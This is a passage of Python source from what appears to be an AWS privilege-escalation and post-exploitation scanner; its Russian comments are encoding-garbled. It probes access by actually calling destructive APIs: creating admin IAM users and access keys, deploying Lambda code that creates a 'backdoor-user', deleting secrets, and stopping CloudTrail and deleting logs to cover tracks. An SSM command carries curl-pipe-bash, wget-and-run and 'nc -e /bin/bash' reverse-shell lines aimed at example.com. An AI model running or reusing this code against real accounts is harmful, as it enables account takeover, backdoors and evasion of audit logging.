            missing_services = [s for s in required_services if s not in accessible_services]
            
            if len(accessible_services) == len(required_services):
                # –í—Å–µ —Å–µ—Ä–≤–∏—Å—ã –¥–æ—Å—Ç—É–ø–Ω—ã
                escalation_results[flow_name] = {
                    'status': 'READY',
                    'message': f'{Fore.GREEN}‚úÖ  {flow_name} - –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø!{Fore.RESET}',
                    'accessible_services': accessible_services,
                    'missing_services': missing_services
                }
                print(f"{Fore.GREEN}‚úÖ  {flow_name} - –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø!{Fore.RESET}")
            elif len(accessible_services) > 0:
                # –ß–∞—Å—Ç–∏—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–æ
                escalation_results[flow_name] = {
                    'status': 'PARTIAL',
                    'message': f'{Fore.YELLOW}‚ö†Ô∏è  {flow_name} - —á–∞—Å—Ç–∏—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–æ ({len(accessible_services)}/{len(required_services)}){Fore.RESET}',
                    'accessible_services': accessible_services,
                    'missing_services': missing_services
                }
                print(f"{Fore.YELLOW}‚ö†Ô∏è  {flow_name} - —á–∞—Å—Ç–∏—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–æ ({len(accessible_services)}/{len(required_services)}){Fore.RESET}")
            else:
                # –ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ
                escalation_results[flow_name] = {
                    'status': 'BLOCKED',
                    'accessible_services': accessible_services,
                    'missing_services': missing_services
                }
        
        # üîÑ –ê–î–ê–ü–¢–ò–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø –ü–†–û–í–ï–†–ö–ò –°–ï–†–í–ò–°–ê
        def check_service(service_name: str, check_func, current: int, total: int):
            start_time = time.time()
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫—ç—à
            if self._is_cache_valid(service_name):
                cached_result = self.service_cache[service_name]
                print(f"‚ö° [{current:2d}/{total:2d}] {service_name:<25} - {cached_result['description']} (–∫—ç—à)")
                results[service_name] = cached_result['result']
                return cached_result['result']['score']
            
            # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø –æ–ø–µ—Ä–∞—Ü–∏–∏ –¥–ª—è –∞–¥–∞–ø—Ç–∏–≤–Ω–æ–≥–æ —Ç–∞–π–º–∞—É—Ç–∞
            operation_type = "write" if any(keyword in service_name for keyword in ["create", "delete", "update", "put", "attach"]) else "read"
            
            # –ü–æ–ª—É—á–∞–µ–º –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ç–∞–π–º–∞—É—Ç
            timeout = self._get_optimized_timeout(service_name)
            
            # –°–æ–∑–¥–∞–µ–º –∞–¥–∞–ø—Ç–∏–≤–Ω—É—é –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –¥–ª—è —ç—Ç–æ–≥–æ —Å–µ—Ä–≤–∏—Å–∞
            service_config = Config(
                region_name=region,
                retries={'max_attempts': self.retry_attempts},
                read_timeout=timeout,
                connect_timeout=timeout
            )
            
            # –ü—Ä–∏–º–µ–Ω—è–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –∫ –∫–ª–∏–µ–Ω—Ç–∞–º (—É–ø—Ä–æ—â–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è)
            try:
                # –í—ã–ø–æ–ª–Ω—è–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É —Å —ç–∫—Å–ø–æ–Ω–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–º backoff
                for attempt in range(self.retry_attempts):
                    try:
                        check_func()
                        break
                    except Exception as e:
                        if attempt < self.retry_attempts - 1:
                            delay = self._calculate_backoff_delay(attempt)
                            time.sleep(delay)
                        else:
                            raise e
                
                # –£—Å–ø–µ—à–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
                response_time = time.time() - start_time
                self._update_performance_stats(service_name, response_time, True)
                
                description = self.service_descriptions.get(service_name, '–æ–ø–∏—Å–∞–Ω–∏–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ')
                score = self.service_scores.get(service_name, 0)
                result = {'accessible': True, 'score': score}
                
                # –ö—ç—à–∏—Ä—É–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                self.service_cache[service_name] = {
                    'result': result,
                    'description': description,
                    'timestamp': time.time()
                }
                
                print(f"‚úÖ [{current:2d}/{total:2d}] {service_name:<25} - {description}")
                results[service_name] = result
                return score
                
            except Exception as e:
                # –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏
                response_time = time.time() - start_time
                self._update_performance_stats(service_name, response_time, False)
                
                description = self.service_descriptions.get(service_name, '–æ–ø–∏—Å–∞–Ω–∏–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ')
                result = {'accessible': False, 'score': 0}
                
                # –ö—ç—à–∏—Ä—É–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –æ—à–∏–±–∫–∏ –Ω–∞ –∫–æ—Ä–æ—Ç–∫–æ–µ –≤—Ä–µ–º—è
                self.service_cache[service_name] = {
                    'result': result,
                    'description': description,
                    'timestamp': time.time()
                }
                
                print(f"‚ùå [{current:2d}/{total:2d}] {service_name:<25} - {description}")
                results[service_name] = result
                return 0
        
        # –ü–æ–¥—Å—á–∏—Ç—ã–≤–∞–µ–º –æ–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–µ—Ä–≤–∏—Å–æ–≤ –¥–ª—è –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
        total_services = 67  # –ü–æ–ª–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–µ—Ä–≤–∏—Å–æ–≤ (–¥–æ–±–∞–≤–∏–ª–∏ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ write –æ–ø–µ—Ä–∞—Ü–∏–∏ + IAM PassRole/CreateAccessKey + Secrets Manager Update/Delete + Systems Manager SendCommand/StartSession/TerminateSession + S3 CreateBucket/DeleteBucket + RDS CreateSnapshot/ExportTask/CopySnapshot + EC2 CreateKeyPair/StartInstances/AuthorizeSecurityGroupIngress + Lambda DeleteFunction/GetFunction/UpdateFunctionConfiguration/AddPermission/PublishVersion/CreateLayerVersion + KMS CreateKey/PutKeyPolicy + CloudWatch DeleteLogs + CloudTrail DeleteTrail/StopLogging/PutEventSelectors + CloudWatch Logs DeleteLogGroup/StopLogging/PutRetentionPolicy/DeleteLogStream + Forensic Cleanup - —É–¥–∞–ª–∏–ª–∏ Lightsail Services, Application Services, Route53 Health Checks, Networking, Storage Services, CloudWatch Logs, —Å—Ä–µ–¥–Ω–∏–π IAM Roles Escalation –∏ iam_escalation, Container Services)
        current_service = 0
        
        # üî¥ –§–õ–û–£ 1: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô - IAM User Escalation (–°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∞–¥–º–∏–Ω –ø—Ä–∞–≤–∞–º–∏)
        if 'IAM User Escalation' in flows_to_check:
            print(f"{Fore.GREEN}üë§  IAM User Escalation{Fore.RESET}")
            current_service += 1; total_score += check_service('iam_create_user', lambda: iam_client.create_user(UserName='test-escalation-user'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_attach_user_policy', lambda: iam_client.attach_user_policy(UserName='test', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_create_access_key', lambda: iam_client.create_access_key(UserName='test'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_put_user_policy', lambda: iam_client.put_user_policy(UserName='test', PolicyName='test-policy', PolicyDocument='{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_create_login_profile', lambda: iam_client.create_login_profile(UserName='test', Password='XXXXXXXXXXXXXX'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_update_login_profile', lambda: iam_client.update_login_profile(UserName='test', Password='XXXXXXXXXXXXXX'), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π —ç—Å–∫–∞–ª–∞—Ü–∏–∏ IAM User
            check_escalation_block(' IAM User Escalation', ['iam_create_user', 'iam_attach_user_policy', 'iam_create_access_key', 'iam_put_user_policy', 'iam_create_login_profile'])
        
        # üî¥ –§–õ–û–£ 2: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô - IAM Role Escalation (–°–æ–∑–¥–∞–Ω–∏–µ —Ä–æ–ª–µ–π –¥–ª—è –ø—Ä–∏–Ω—è—Ç–∏—è)
        if 'IAM Role Escalation' in flows_to_check:
            print(f"\n{Fore.GREEN}üîë  IAM Role Escalation{Fore.RESET}")
            current_service += 1; total_score += check_service('iam_create_role', lambda: iam_client.create_role(RoleName='test-escalation-role', AssumeRolePolicyDocument='{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}]}'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_attach_role_policy', lambda: iam_client.attach_role_policy(RoleName='test', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'), current_service, total_services)
            current_service += 1; total_score += check_service('sts_assume_role', lambda: sts_client.assume_role(RoleArn='arn:aws:iam::123456789012:role/test', RoleSessionName='test'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_pass_role', lambda: lambda_client.create_function(FunctionName='test-passrole', Runtime='python3.9', Role='arn:aws:iam::123456789012:role/test-role', Handler='index.handler', Code={'ZipFile': b'def handler(event, context): return "test"'} if hasattr(lambda_client, 'create_function') else None), current_service, total_services)
            current_service += 1; total_score += check_service('iam_put_role_policy', lambda: iam_client.put_role_policy(RoleName='test', PolicyName='test-policy', PolicyDocument='{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_update_assume_role_policy', lambda: iam_client.update_assume_role_policy(RoleName='test', PolicyDocument='{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}'), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π —ç—Å–∫–∞–ª–∞—Ü–∏–∏ IAM Role
            check_escalation_block(' IAM Role Escalation', ['iam_create_role', 'iam_attach_role_policy', 'sts_assume_role', 'iam_pass_role'])
        
        # üî¥ –§–õ–û–£ 3: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô - Secrets Manager (–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —É–≥—Ä–æ–∑–∞ - –ø–æ–ª—É—á–µ–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–æ–≤)
        if 'Secrets Manager' in flows_to_check:
            print(f"\n{Fore.GREEN}üîê  Secrets Manager{Fore.RESET}")
            current_service += 1; total_score += check_service('secrets_manager_secrets', lambda: secrets_client.list_secrets(), current_service, total_services)
            current_service += 1; total_score += check_service('secrets_manager_create_secret', lambda: secrets_client.create_secret(Name='test-escalation-secret', SecretString='test-value'), current_service, total_services)
            current_service += 1; total_score += check_service('secrets_manager_update_secret', lambda: secrets_client.update_secret(SecretId='test-secret', SecretString='{"admin_password": "new_password"}'), current_service, total_services)
            current_service += 1; total_score += check_service('secrets_manager_delete_secret', lambda: secrets_client.delete_secret(SecretId='test-secret', ForceDeleteWithoutRecovery=True), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π —ç—Å–∫–∞–ª–∞—Ü–∏–∏ Secrets Manager
            check_escalation_block(' Secrets Manager', ['secrets_manager_secrets', 'secrets_manager_create_secret', 'secrets_manager_update_secret'])
        
        if 'Systems Manager' in flows_to_check:
            print(f"\n{Fore.GREEN}‚öôÔ∏è  Systems Manager{Fore.RESET}")
            current_service += 1; total_score += check_service('systems_manager_commands', lambda: ssm_client.send_command(InstanceIds=['test'], DocumentName='AWS-RunShellScript', Parameters={'commands': ['echo test']}), current_service, total_services)
            current_service += 1; total_score += check_service('systems_manager_parameters', lambda: ssm_client.describe_parameters(), current_service, total_services)
            current_service += 1; total_score += check_service('systems_manager_send_command', lambda: ssm_client.send_command(InstanceIds=['i-1234567890abcdef0'], DocumentName='AWS-RunShellScript', Parameters={'commands': ['curl http://example.com/script.sh | bash', 'nc -e /bin/bash example.com 4444', 'wget http://example.com/script.sh -O /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh']}), current_service, total_services)
            current_service += 1; total_score += check_service('systems_manager_start_session', lambda: ssm_client.start_session(Target='i-1234567890abcdef0', DocumentName='SSM-SessionManagerRunShell'), current_service, total_services)
            current_service += 1; total_score += check_service('systems_manager_terminate_session', lambda: ssm_client.terminate_session(SessionId='test-session-id'), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π —ç—Å–∫–∞–ª–∞—Ü–∏–∏ Systems Manager
            check_escalation_block(' Systems Manager', ['systems_manager_commands', 'systems_manager_parameters', 'systems_manager_send_command', 'systems_manager_start_session'])
        
        # üî¥ –§–õ–û–£ 4: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô - S3 Data Exfiltration (–ü—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω—ã–º)
        if 'S3 Data Exfiltration' in flows_to_check:
            print(f"\n{Fore.GREEN}üíæ  S3 Data Exfiltration{Fore.RESET}")
            current_service += 1; total_score += check_service('s3_buckets', lambda: s3_client.list_buckets(), current_service, total_services)
            current_service += 1; total_score += check_service('s3_objects', lambda: s3_client.list_objects_v2(Bucket='test', MaxKeys=1), current_service, total_services)
            current_service += 1; total_score += check_service('s3_put_object', lambda: s3_client.put_object(Bucket='test', Key='test.txt', Body=b'test'), current_service, total_services)
            current_service += 1; total_score += check_service('s3_create_bucket', lambda: s3_client.create_bucket(Bucket='test-escalation-bucket-' + str(int(time.time()))), current_service, total_services)
            current_service += 1; total_score += check_service('s3_delete_bucket', lambda: s3_client.delete_bucket(Bucket='test-bucket'), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π —ç—Å–∫–∞–ª–∞—Ü–∏–∏ S3
            check_escalation_block(' S3 Data Exfiltration', ['s3_buckets', 's3_objects', 's3_put_object', 's3_create_bucket', 's3_delete_bucket'])
        
        # üî¥ –§–õ–û–£ 7: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô - RDS Data Extraction (–ö—Ä–∞–∂–∞ –¥–∞–Ω–Ω—ã—Ö –ë–î)
        if 'RDS Data Extraction' in flows_to_check:
            print(f"\n{Fore.GREEN}üóÑÔ∏è  RDS Data Extraction{Fore.RESET}")
            current_service += 1; total_score += check_service('rds_instances', lambda: rds_client.describe_db_instances(), current_service, total_services)
            current_service += 1; total_score += check_service('rds_snapshots', lambda: rds_client.describe_db_snapshots(), current_service, total_services)
            current_service += 1; total_score += check_service('rds_clusters', lambda: rds_client.describe_db_clusters(), current_service, total_services)
            current_service += 1; total_score += check_service('rds_create_db_snapshot', lambda: rds_client.create_db_snapshot(DBInstanceIdentifier='test-db', DBSnapshotIdentifier='test-snapshot'), current_service, total_services)
            current_service += 1; total_score += check_service('rds_start_export_task', lambda: rds_client.start_export_task(ExportTaskIdentifier='test-export', SourceArn='arn:aws:rds:region:account:snapshot:test-snapshot', S3BucketName='test-bucket', S3Prefix='exports/', IamRoleArn='arn:aws:iam::account:role/ExportRole'), current_service, total_services)
            current_service += 1; total_score += check_service('rds_copy_db_snapshot', lambda: rds_client.copy_db_snapshot(SourceDBSnapshotIdentifier='test-snapshot', TargetDBSnapshotIdentifier='test-copy'), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π —ç—Å–∫–∞–ª–∞—Ü–∏–∏ RDS
            check_escalation_block(' RDS Data Extraction', ['rds_instances', 'rds_snapshots', 'rds_clusters', 'rds_create_db_snapshot', 'rds_start_export_task'])
        
        # üî¥ –§–õ–û–£ 5: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô - EC2 Management Attack (–î–æ—Å—Ç—É–ø –∫ —Å–µ—Ä–≤–µ—Ä–∞–º)
        if 'EC2 Management Attack' in flows_to_check:
            print(f"\n{Fore.GREEN}üíª  EC2 Management Attack{Fore.RESET}")
            current_service += 1; total_score += check_service('ec2_instances', lambda: ec2_client.describe_instances(), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_volumes', lambda: ec2_client.describe_volumes(), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_snapshots', lambda: ec2_client.describe_snapshots(), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_run_instances', lambda: ec2_client.run_instances(ImageId='ami-12345678', MinCount=1, MaxCount=1, UserData='#!/bin/bash\necho "test script"'), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_create_key_pair', lambda: ec2_client.create_key_pair(KeyName='malicious-key'), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_start_instances', lambda: ec2_client.start_instances(InstanceIds=['i-1234567890abcdef0']), current_service, total_services)
            current_service += 1; total_score += check_service('ec2_authorize_security_group_ingress', lambda: ec2_client.authorize_security_group_ingress(GroupId='sg-12345678', IpPermissions=[{'IpProtocol': 'tcp', 'FromPort': 22, 'ToPort': 22, 'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}, {'IpProtocol': 'tcp', 'FromPort': 80, 'ToPort': 80, 'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}, {'IpProtocol': 'tcp', 'FromPort': 443, 'ToPort': 443, 'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}]), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π —ç—Å–∫–∞–ª–∞—Ü–∏–∏ EC2
            check_escalation_block(' EC2 Management Attack', ['ec2_instances', 'ec2_volumes', 'ec2_snapshots', 'ec2_run_instances', 'ec2_create_key_pair', 'ec2_start_instances', 'ec2_authorize_security_group_ingress'])
        
        # üî¥ –§–õ–û–£ 6: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô - Lambda Privilege Escalation (–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞)
        if 'Lambda Privilege Escalation' in flows_to_check:
            print(f"\n{Fore.GREEN}üöÄ  Lambda Privilege Escalation{Fore.RESET}")
            current_service += 1; total_score += check_service('lambda_functions', lambda: lambda_client.list_functions(), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_create_function', lambda: lambda_client.create_function(FunctionName='test-escalation', Runtime='python3.9', Role='arn:aws:iam::123456789012:role/test', Handler='index.handler', Code={'ZipFile': b'import boto3\ndef handler(event, context):\n    iam = boto3.client("iam")\n    iam.create_user(UserName="test-user")\n    iam.attach_user_policy(UserName="test-user", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")\n    return {"statusCode": 200}'}), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_invoke_function', lambda: lambda_client.invoke(FunctionName='test', Payload=b'{}'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_update_function_code', lambda: lambda_client.update_function_code(FunctionName='test', ZipFile=b'import boto3\ndef handler(event, context):\n    s3 = boto3.client("s3")\n    s3.create_bucket(Bucket="test-bucket")\n    return {"statusCode": 200}'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_delete_function', lambda: lambda_client.delete_function(FunctionName='test-function'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_get_function', lambda: lambda_client.get_function(FunctionName='test-function'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_update_function_configuration', lambda: lambda_client.update_function_configuration(FunctionName='test-function', Environment={'Variables': {'TEST_VAR': 'true'}}), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_add_permission', lambda: lambda_client.add_permission(FunctionName='test-function', StatementId='test-permission', Action='lambda:InvokeFunction', Principal='*'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_publish_version', lambda: lambda_client.publish_version(FunctionName='test-function'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_create_layer_version', lambda: lambda_client.create_layer_version(LayerName='malicious-layer', Content={'ZipFile': b'import boto3\ndef malicious_function():\n    iam = boto3.client("iam")\n    iam.create_user(UserName="backdoor-user")\n    return "Privilege escalation successful"'}, CompatibleRuntimes=['python3.9']), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π —ç—Å–∫–∞–ª–∞—Ü–∏–∏ Lambda
            check_escalation_block(' Lambda Privilege Escalation', ['lambda_functions', 'lambda_create_function', 'lambda_invoke_function', 'lambda_update_function_code', 'lambda_delete_function', 'lambda_get_function', 'lambda_update_function_configuration', 'lambda_add_permission', 'lambda_publish_version', 'lambda_create_layer_version'])
        
        
        # üü° –§–õ–û–£ 8: –í–´–°–û–ö–ò–ô –ü–†–ò–û–†–ò–¢–ï–¢ - Security & Compliance (–ö–ª—é—á–∏ –∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ)
        if 'Security & Compliance' in flows_to_check:
            print(f"\n{Fore.WHITE}üîí  Security & Compliance{Fore.RESET}")
            current_service += 1; total_score += check_service('kms_keys', lambda: kms_client.list_keys(), current_service, total_services)
            current_service += 1; total_score += check_service('kms_aliases', lambda: kms_client.list_aliases(), current_service, total_services)
            current_service += 1; total_score += check_service('kms_create_key', lambda: kms_client.create_key(Description='malicious-key'), current_service, total_services)
            current_service += 1; total_score += check_service('kms_put_key_policy', lambda: kms_client.put_key_policy(KeyId='test-key-id', PolicyName='default', Policy='{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Principal": "*", "Action": "kms:*", "Resource": "*"}]}'), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç —ç—Å–∫–∞–ª–∞—Ü–∏–∏ Security & Compliance
            check_escalation_block(' Security & Compliance', ['kms_keys', 'kms_aliases', 'kms_create_key', 'kms_put_key_policy'])
        
        # üü¢ –§–õ–û–£ 9: –°–†–ï–î–ù–ò–ô –ü–†–ò–û–†–ò–¢–ï–¢ - IAM Groups Escalation
        if 'IAM Groups Escalation' in flows_to_check:
            print(f"\n{Fore.WHITE}üë•  IAM Groups Escalation{Fore.RESET}")
            current_service += 1; total_score += check_service('iam_users', lambda: iam_client.list_users(), current_service, total_services)
            current_service += 1; total_score += check_service('iam_groups', lambda: iam_client.list_groups(), current_service, total_services)
            current_service += 1; total_score += check_service('iam_create_group', lambda: iam_client.create_group(GroupName='test-escalation-group'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_attach_group_policy', lambda: iam_client.attach_group_policy(GroupName='test', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'), current_service, total_services)
            current_service += 1; total_score += check_service('iam_add_user_to_group', lambda: iam_client.add_user_to_group(GroupName='test', UserName='test'), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç —ç—Å–∫–∞–ª–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ –≥—Ä—É–ø–ø—ã
            check_escalation_block(' IAM Groups Escalation', ['iam_users', 'iam_groups', 'iam_create_group', 'iam_attach_group_policy', 'iam_add_user_to_group'])
        
        # üî¥ –§–õ–û–£ 10: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô - Log Deletion Attack (–°–æ–∫—Ä—ã—Ç–∏–µ —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫)
        if 'Log Deletion Attack' in flows_to_check:
            print(f"\n{Fore.RED}üóëÔ∏è  Log Deletion Attack{Fore.RESET}")
            current_service += 1; total_score += check_service('cloudtrail_delete_trail', lambda: cloudtrail_client.delete_trail(Name='test-trail'), current_service, total_services)
            current_service += 1; total_score += check_service('cloudtrail_stop_logging', lambda: cloudtrail_client.stop_logging(Name='test-trail'), current_service, total_services)
            current_service += 1; total_score += check_service('cloudtrail_put_event_selectors', lambda: cloudtrail_client.put_event_selectors(TrailName='test-trail', EventSelectors=[{'ReadWriteType': 'ReadOnly', 'IncludeManagementEvents': False, 'DataResources': [{'Type': 'AWS::S3::Object', 'Values': ['arn:aws:s3:::malicious-bucket/*']}]}]), current_service, total_services)
            current_service += 1; total_score += check_service('cloudwatch_logs_delete_log_group', lambda: logs_client.delete_log_group(logGroupName='/aws/lambda/test-function'), current_service, total_services)
            current_service += 1; total_score += check_service('cloudwatch_logs_stop_logging', lambda: logs_client.stop_logging(logGroupName='/aws/lambda/test-function'), current_service, total_services)
            current_service += 1; total_score += check_service('cloudwatch_logs_put_retention_policy', lambda: logs_client.put_retention_policy(logGroupName='/aws/lambda/test-function', retentionInDays=1), current_service, total_services)
            current_service += 1; total_score += check_service('cloudwatch_logs_delete_log_stream', lambda: logs_client.delete_log_stream(logGroupName='/aws/lambda/test-function', logStreamName='test-stream'), current_service, total_services)
            current_service += 1; total_score += check_service('cloudwatch_delete_logs', lambda: logs_client.delete_log_group(logGroupName='/malicious/logs'), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π –∞—Ç–∞–∫–∏ –Ω–∞ –ª–æ–≥–∏
            check_escalation_block(' Log Deletion Attack', ['cloudtrail_delete_trail', 'cloudtrail_stop_logging', 'cloudtrail_put_event_selectors', 'cloudwatch_logs_delete_log_group', 'cloudwatch_logs_stop_logging', 'cloudwatch_logs_put_retention_policy', 'cloudwatch_logs_delete_log_stream', 'cloudwatch_delete_logs'])
        
        # üî¥ –§–õ–û–£ 11: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô - Forensic Cleanup Attack (–û—á–∏—Å—Ç–∫–∞ —Å–ª–µ–¥–æ–≤)
        if 'Forensic Cleanup Attack' in flows_to_check:
            print(f"\n{Fore.RED}üßπ  Forensic Cleanup Attack{Fore.RESET}")
            current_service += 1; total_score += check_service('secrets_manager_delete_secret', lambda: secrets_client.delete_secret(SecretId='test-secret', ForceDeleteWithoutRecovery=True), current_service, total_services)
            current_service += 1; total_score += check_service('s3_delete_bucket', lambda: s3_client.delete_bucket(Bucket='test-malicious-bucket'), current_service, total_services)
            current_service += 1; total_score += check_service('lambda_delete_function', lambda: lambda_client.delete_function(FunctionName='test-malicious-function'), current_service, total_services)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–π –æ—á–∏—Å—Ç–∫–∏
            check_escalation_block(' Forensic Cleanup Attack', ['secrets_manager_delete_secret', 's3_delete_bucket', 'lambda_delete_function'])
        
        
        print(f"{Fore.CYAN}{'‚îÄ'*50}{Fore.RESET}")
        print()
        
        # üìä –°–¢–ê–¢–ò–°–¢–ò–ö–ê –ü–†–û–ò–ó–í–û–î–ò–¢–ï–õ–¨–ù–û–°–¢–ò
        self._print_performance_stats()
        
        return {
            'results': results,
            'total_score': total_score,
            'accessible_services': [name for name, result in results.items() if result['accessible']],
            'escalation_results': escalation_results,
            'performance_stats': self.performance_stats
        }
    
    def _print_performance_stats(self):
        """–í—ã–≤–æ–¥–∏—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏"""
        stats = self.performance_stats
        
        if stats['total_requests'] == 0:
            return
        
        success_rate = (stats['successful_requests'] / stats['total_requests']) * 100
        
        print(f"{Fore.CYAN}üìä –°–¢–ê–¢–ò–°–¢–ò–ö–ê –ü–†–û–ò–ó–í–û–î–ò–¢–ï–õ–¨–ù–û–°–¢–ò{Fore.RESET}")
        print(f"{Fore.CYAN}{'‚îÄ'*35}{Fore.RESET}")
        print(f"  –í—Å–µ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤: {Fore.WHITE}{stats['total_requests']}{Fore.RESET}")
        print(f"  –£—Å–ø–µ—à–Ω—ã—Ö: {Fore.GREEN}{stats['successful_requests']}{Fore.RESET}")
        print(f"  –û—à–∏–±–æ–∫: {Fore.RED}{stats['failed_requests']}{Fore.RESET}")
        print(f"  –£—Å–ø–µ—à–Ω–æ—Å—Ç—å: {Fore.YELLOW}{success_rate:.1f}%{Fore.RESET}")
        
